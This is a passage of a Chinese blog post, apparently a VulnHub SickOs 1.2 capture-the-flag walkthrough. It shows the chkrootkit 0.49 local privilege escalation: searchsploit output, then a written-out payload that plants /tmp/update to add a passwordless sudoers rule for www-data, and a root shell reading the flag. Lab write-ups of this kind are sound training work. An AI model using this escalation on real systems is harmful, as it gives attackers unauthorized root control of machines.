+</span></span><span class=line><span class=cl>    <span class=m>18</span>      <span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$DIFF_MODE</span><span class=s2>&#34;</span> <span class=o>=</span> <span class=s2>&#34;true&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl>    <span class=m>19</span>                                  <span class=nb>eval</span> <span class=nv>$CHKROOTKIT</span> <span class=nv>$RUN_DAILY_OPTS</span> &gt; <span class=nv>$LOG_DIR</span>/log.today.raw 2&gt;<span class=p>&amp;</span><span class=m>1</span>
+</span></span><span class=line><span class=cl>    <span class=m>20</span>                                  <span class=c1># the sed expression replaces the messages about /sbin/dhclient3 /usr/sbin/dhcpd3</span>
+</span></span><span class=line><span class=cl>    <span class=m>21</span>                                  <span class=c1># with a message that is the same whatever order eth0 and eth1 were scanned</span>
+</span></span><span class=line><span class=cl>    <span class=m>22</span>                                  sed -r -e <span class=s1>&#39;s,eth(0|1)(:[0-9])?: PACKET SNIFFER\((/sbin/dhclient3|/usr/sbin/dhcpd3)\[[0-9]+\]\),eth\[0|1\]: PACKET SNIFFER\([dhclient3|dhcpd3]{PID}\),&#39;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>    <span class=m>23</span>                                  -e <span class=s1>&#39;s/(! \w+\s+)[ 0-9]{4}[0-9]/\1#####/&#39;</span> <span class=nv>$LOG_DIR</span>/log.today.raw &gt; <span class=nv>$LOG_DIR</span>/log.today
+</span></span><span class=line><span class=cl>    <span class=m>24</span>          <span class=k>if</span> <span class=o>[</span> ! -f <span class=nv>$LOG_DIR</span>/log.expected <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl>    <span class=m>25</span>                                                  <span class=nb>echo</span> <span class=s2>&#34;ERROR: No file </span><span class=nv>$LOG_DIR</span><span class=s2>/log.expected&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=m>26</span>                                                  <span class=nb>echo</span> <span class=s2>&#34;This file should contain expected output from chkrootkit&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=m>27</span>                                                  <span class=nb>echo</span>
+</span></span><span class=line><span class=cl>    <span class=m>28</span>                                                  <span class=nb>echo</span> <span class=s2>&#34;Today&#39;s run produced the following output:&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=m>29</span>                                                  <span class=nb>echo</span> <span class=s2>&#34;--- [ BEGIN: cat </span><span class=nv>$LOG_DIR</span><span class=s2>/log.today  ] ---&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=m>30</span>                                                  cat <span class=nv>$LOG_DIR</span>/log.today
+</span></span><span class=line><span class=cl>    <span class=m>31</span>                                                  <span class=nb>echo</span> <span class=s2>&#34;--- [ END: cat </span><span class=nv>$LOG_DIR</span><span class=s2>/log.today ] ---&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=m>32</span>                                                  <span class=nb>echo</span>
+</span></span><span class=line><span class=cl>    <span class=m>33</span>                                                  <span class=nb>echo</span> <span class=s2>&#34;To create this file containing all output from today&#39;s run, do (as root)&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=m>34</span>                                                  <span class=nb>echo</span> <span class=s2>&#34;# cp -a </span><span class=nv>$LOG_DIR</span><span class=s2>/log.today </span><span class=nv>$LOG_DIR</span><span class=s2>/log.expected&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=m>35</span>                                                  <span class=nb>echo</span> <span class=s2>&#34;# (note that unedited output is in </span><span class=nv>$LOG_DIR</span><span class=s2>/log.today.raw)&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=m>36</span>                                  <span class=k>elif</span> ! diff -q <span class=nv>$LOG_DIR</span>/log.expected <span class=nv>$LOG_DIR</span>/log.today &gt; /dev/null 2&gt;<span class=p>&amp;</span>1<span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl>    <span class=m>37</span>                                                  <span class=nb>echo</span> <span class=s2>&#34;ERROR: chkrootkit output was not as expected.&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=m>38</span>                                                  <span class=nb>echo</span>
+</span></span><span class=line><span class=cl>    <span class=m>39</span>                                                  <span class=nb>echo</span> <span class=s2>&#34;The difference is:&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=m>40</span>                                                  <span class=nb>echo</span> <span class=s2>&#34;---[ BEGIN: diff -u </span><span class=nv>$LOG_DIR</span><span class=s2>/log.expected </span><span class=nv>$LOG_DIR</span><span class=s2>/log.today ] ---&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=m>41</span>                                                  diff -u <span class=nv>$LOG_DIR</span>/log.expected <span class=nv>$LOG_DIR</span>/log.today <span class=o>||</span> <span class=nb>true</span>
+</span></span><span class=line><span class=cl>    <span class=m>42</span>                                                  <span class=nb>echo</span> <span class=s2>&#34;---[ END: diff -u </span><span class=nv>$LOG_DIR</span><span class=s2>/log.expected </span><span class=nv>$LOG_DIR</span><span class=s2>/log.today ] ---&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=m>43</span>                                                  <span class=nb>echo</span>
+</span></span><span class=line><span class=cl>    <span class=m>44</span>                                                  <span class=nb>echo</span> <span class=s2>&#34;To update the expected output, run (as root)&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=m>45</span>                                                  <span class=nb>echo</span> <span class=s2>&#34;#  cp -a -f </span><span class=nv>$LOG_DIR</span><span class=s2>/log.today </span><span class=nv>$LOG_DIR</span><span class=s2>/log.expected&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=m>46</span>                                                  <span class=nb>echo</span> <span class=s2>&#34;# (note that unedited output is in </span><span class=nv>$LOG_DIR</span><span class=s2>/log.today.raw)&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=m>47</span>          <span class=k>fi</span>
+</span></span><span class=line><span class=cl>    <span class=m>48</span>      <span class=k>else</span>
+</span></span><span class=line><span class=cl>    <span class=m>49</span>          <span class=nb>eval</span> <span class=nv>$CHKROOTKIT</span> <span class=nv>$RUN_DAILY_OPTS</span>
+</span></span><span class=line><span class=cl>    <span class=m>50</span>      <span class=k>fi</span>
+</span></span><span class=line><span class=cl>    <span class=m>51</span>  <span class=k>fi</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=利用漏洞库寻找chkrootkit的漏洞>利用漏洞库寻找chkrootkit的漏洞</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ searchsploit chkrootkit 0.49
+</span></span><span class=line><span class=cl>-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class=line><span class=cl> Exploit Title                                                                                                                                                            <span class=p>|</span>  Path
+</span></span><span class=line><span class=cl>-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class=line><span class=cl>Chkrootkit - Local Privilege Escalation <span class=o>(</span>Metasploit<span class=o>)</span>                                                                                                                      <span class=p>|</span> linux/local/38775.rb
+</span></span><span class=line><span class=cl>Chkrootkit 0.49 - Local Privilege Escalation                                                                                                                              <span class=p>|</span> linux/local/33899.txt
+</span></span><span class=line><span class=cl>-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class=line><span class=cl>Shellcodes: No Results
+</span></span></code></pre></td></tr></table></div></div><p>已经搜到了，版本甚至对的上</p><p>先看手动那条exp，理解漏洞原理和触发条件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>searchsploit -x linux/local/33899.txt
+</span></span></code></pre></td></tr></table></div></div><p>看完按q退出</p><p>它利用的是 chkrootkit 里一段<strong>变量没加引号</strong>的代码。chkrootkit 在检查 Slapper 蠕虫时，会尝试执行 <code>/tmp/update</code> 等文件。如果这个文件存在且可执行，chkrootkit 就会以运行它的用户权限执行它。</p><p>而 /etc/cron.daily/chkrootkit 是被 root 的 cron 触发的，所以链条是：</p><p>root cron → /etc/cron.daily/chkrootkit → /usr/sbin/chkrootkit → /tmp/update（以 root 执行）</p><p>后面需要做的</p><ol><li><p>在靶机上创建 /tmp/update，内容是一段 shell 命令</p></li><li><p>chmod +x /tmp/update 给它执行权限</p></li><li><p>等 root 的 cron 触发 chkrootkit</p></li></ol><h2 id=编写恶意脚本提权至root>编写恶意脚本提权至root</h2><p>创建恶意 update 文件：在 /tmp 目录下创建文件，并写入提权命令。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;chmod 777 /etc/sudoers &amp;&amp; echo &#34;www-data ALL=(ALL) NOPASSWD:ALL&#34; &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers&#39;</span> &gt; /tmp/update
+</span></span></code></pre></td></tr></table></div></div><p>赋予执行权限：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>chmod +x /tmp/update
+</span></span></code></pre></td></tr></table></div></div><p>手动触发脚本：直接执行 /etc/cron.daily/chkrootkit 脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>/etc/cron.daily/chkrootkit
+</span></span></code></pre></td></tr></table></div></div><p>验证提权：检查 sudo 权限是否已生效</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@ubuntu:/$ sudo -l
+</span></span><span class=line><span class=cl>sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> www-data on this host:
+</span></span><span class=line><span class=cl>    env_reset,
+</span></span><span class=line><span class=cl>    <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User www-data may run the following commands on this host:
+</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL<span class=o>)</span> NOPASSWD: ALL
+</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL<span class=o>)</span> NOPASSWD: ALL
+</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL<span class=o>)</span> NOPASSWD: ALL
+</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL<span class=o>)</span> NOPASSWD: ALL
+</span></span></code></pre></td></tr></table></div></div><h2 id=切换到-root-获取flag>切换到 root 获取flag</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@ubuntu:/$ sudo su
+</span></span><span class=line><span class=cl>sudo su
+</span></span><span class=line><span class=cl>root@ubuntu:/# <span class=nb>cd</span> /root
+</span></span><span class=line><span class=cl><span class=nb>cd</span> /root
+</span></span><span class=line><span class=cl>root@ubuntu:~# ls -liah
+</span></span><span class=line><span class=cl>ls -liah
+</span></span><span class=line><span class=cl>total 76K
+</span></span><span class=line><span class=cl><span class=m>393219</span> drwx------  <span class=m>4</span> root root 4.0K Apr <span class=m>26</span>  <span class=m>2016</span> .
+</span></span><span class=line><span class=cl>     <span class=m>2</span> drwxr-xr-x <span class=m>22</span> root root 4.0K Mar <span class=m>30</span>  <span class=m>2016</span> ..
+</span></span><span class=line><span class=cl><span class=m>394966</span> -rw-r--r--  <span class=m>1</span> root root  39K Apr  <span class=m>9</span>  <span class=m>2015</span> 304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz
+</span></span><span class=line><span class=cl><span class=m>394993</span> -r--------  <span class=m>1</span> root root  <span class=m>491</span> Apr <span class=m>26</span>  <span class=m>2016</span> 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
+</span></span><span class=line><span class=cl><span class=m>394963</span> -rw-------  <span class=m>1</span> root root 3.0K Apr <span class=m>26</span>  <span class=m>2016</span> .bash_history
+</span></span><span class=line><span class=cl><span class=m>393221</span> -rw-r--r--  <span class=m>1</span> root root 3.1K Apr <span class=m>19</span>  <span class=m>2012</span> .bashrc
+</span></span><span class=line><span class=cl><span class=m>394964</span> drwx------  <span class=m>2</span> root root 4.0K Apr <span class=m>12</span>  <span class=m>2016</span> .cache
+</span></span><span class=line><span class=cl><span class=m>394967</span> drwxr-xr-x  <span class=m>2</span> john john 4.0K Apr <span class=m>12</span>  <span class=m>2016</span> chkrootkit-0.49
+</span></span><span class=line><span class=cl><span class=m>394984</span> -rw-r--r--  <span class=m>1</span> root root  <span class=m>541</span> Apr <span class=m>25</span>  <span class=m>2016</span> newRule
+</span></span><span class=line><span class=cl><span class=m>393220</span> -rw-r--r--  <span class=m>1</span> root root  <span class=m>140</span> Apr <span class=m>19</span>  <span class=m>2012</span> .profile
+</span></span><span class=line><span class=cl>root@ubuntu:~# cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
+</span></span><span class=line><span class=cl>cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
+</span></span><span class=line><span class=cl>WoW! If you are viewing this, You have <span class=s2>&#34;Sucessfully!!&#34;</span> completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester<span class=o>(</span>s<span class=o>)</span>, gathering more information about the target using different methods, though <span class=k>while</span> developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Thanks <span class=k>for</span> giving this try.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>@vulnhub: Thanks <span class=k>for</span> hosting this UP!.
+</span></span></code></pre></td></tr></table></div></div></section><footer class="article-meta article-footer"><section class=article-tags><a href=/tags/vulnhub/>Vulnhub</a></section><section class="article-copyright inline-meta"><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2026 Ke1thLi 的技术笔记</section><section class=powerby>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=4.0.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><script type=module>
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js")).default;
+        const styleHref = "https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js")
+        });
+        lightbox.init();
+    }
+</script></main></div><script type=text/javascript src=/ts/main.acaf849f2b273f6a8368a58b001f336738d0c948d92e79b116467d0c7515f932.js defer></script></body></html>
